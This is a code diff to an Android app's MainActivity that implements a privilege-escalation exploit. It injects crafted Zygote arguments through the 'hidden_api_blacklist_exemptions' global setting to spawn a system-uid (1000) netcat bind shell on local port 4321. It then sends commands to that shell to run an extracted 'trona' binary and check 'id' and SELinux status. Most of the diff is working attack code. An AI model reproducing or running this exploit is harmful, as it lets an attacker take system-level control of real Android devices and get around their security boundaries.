@@ -9,9 +9,11 @@ import android.widget.LinearLayout;
 import android.widget.ScrollView;
 import android.widget.TextView;
 
+import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 
 public class MainActivity extends Activity {
@@ -61,13 +63,13 @@ public class MainActivity extends Activity {
 
     private void runSystemExploit() {
         outputView.setText("");
-        log("Injecting Zygote payload via hidden API exemptions...");
+        log("Triggering Zygote system-uid listener payload...");
 
         new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
-                    // Extract trona binary to app's private files dir
+                    // Extract trona binary so it's accessible by the system shell
                     File outFile = new File(getFilesDir(), "trona");
                     if (!outFile.exists()) {
                         InputStream in = getAssets().open("trona");
@@ -79,33 +81,42 @@ public class MainActivity extends Activity {
                         }
                         in.close();
                         out.close();
-                        log("Binary extracted to private storage.");
+                        log("Binary extracted.");
                     }
-
                     outFile.setExecutable(true, false);
-                    log("Binary ready at: " + outFile.getAbsolutePath());
 
-                    // Craft the full injection payload targeting system user (uid=1000)
-                    String exploitPayload = "LClass1;->method1( 10 --runtime-args --setuid=1000 --setgid=1000 --runtime-flags=2049 --mount-external-full --setgroups=3003 --nice-name=tronaexec --seinfo=platform:targetSdkVersion=28:complete --invoke-with " + outFile.getAbsolutePath() + "; ";
+                    // 1. Inject Zygote payload to spawn a system-uid (1000) netcat shell on port 4321
+                    String exploitPayload = "LClass1;->method1( 10 --runtime-args --setuid=1000 --setgid=1000 --runtime-flags=2049 --mount-external-full --setgroups=3003 --nice-name=tronashell --seinfo=platform:targetSdkVersion=28:complete --invoke-with toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l; ";
 
-                    log("Writing payload to secure settings...");
                     Settings.Global.putString(
                         getContentResolver(),
                         "hidden_api_blacklist_exemptions",
                         exploitPayload
                     );
-                    log("Payload injected. Triggering evaluation...");
+                    log("Payload injected. Waiting for system-uid listener to spin up...");
+                    Thread.sleep(1500);
 
-                    // Force system evaluation of the setting change
-                    Thread.sleep(1000);
-
-                    // Clean up setting to prevent bootloops or crash loops
+                    // Clean up setting immediately to prevent bootloops
                     Settings.Global.putString(
                         getContentResolver(),
                         "hidden_api_blacklist_exemptions",
                         ""
                     );
-                    log("Settings cleaned up. Check system logs/SELinux status.");
+                    log("Settings cleaned up. Connecting to system-uid socket...");
+
+                    // 2. Connect to the local system-uid port and execute our exploit/commands
+                    ProcessBuilder pb = new ProcessBuilder("sh", "-c", "echo '" + outFile.getAbsolutePath() + " && id && getenforce' | toybox nc 127.0.0.1 4321");
+                    pb.redirectErrorStream(true);
+                    Process process = pb.start();
+
+                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        log(line);
+                    }
+
+                    int exitCode = process.waitFor();
+                    log("Execution finished with code: " + exitCode);
 
                 } catch (Exception e) {
                     e.printStackTrace();
